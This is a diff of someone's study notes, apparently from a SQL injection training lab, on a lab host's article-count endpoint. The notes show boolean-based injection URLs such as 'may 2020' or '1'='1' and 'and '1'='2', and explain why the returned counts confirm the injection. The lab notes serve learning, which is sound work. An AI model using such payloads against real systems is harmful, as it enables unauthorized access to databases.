@@ -177,12 +177,19 @@ http://sqli2.naham.sec:8081/article-count?date=may%202020%27%20and%20%271=1
 ![[Screenshot From 2025-03-04 22-41-07.png]]
 it returns count=2,  therefore the sqli successfully executed
 
-same for this  ( may 2020' or '1'='1 )   |  ()
+same for these  ( may 2020' or '1'='1 )   |  ( 'may 2020' or '1'='1 )
 http://sqli2.naham.sec:8081/article-count?date=may%202020%27%20or%20%271%27=%271
 ![[Pasted image 20250304224507.png]]
 
+Also if we do ( may 2020' and '1'='2 )
+http://sqli2.naham.sec:8081/article-count?date=may%202020%27%20and%20%271%27=%272
+it returns count=0
+![[Screenshot From 2025-03-04 22-49-59.png]]
+that means the query got executed in db , and the query was date = may 2020 and 1=2
 
+since 1=2 is false , even though  date = may 2020 is true
 
+due to " and " 
 
 ---
 
